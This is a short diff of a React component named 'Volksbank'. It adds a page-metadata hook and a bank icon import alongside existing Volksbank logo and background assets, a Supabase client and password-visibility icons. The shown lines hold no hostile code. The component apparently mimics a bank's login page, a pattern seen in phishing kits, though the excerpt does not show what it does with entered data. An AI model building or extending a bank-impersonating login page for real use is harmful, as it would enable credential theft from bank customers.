@@ -2,9 +2,11 @@ import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
 import { X, Eye, EyeOff } from "lucide-react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankBg from "@/assets/volksbank-bg.png";
+import volksbankIcon from "@/assets/volksbank.png";
 
 const Volksbank = () => {
   const [searchParams] = useSearchParams();
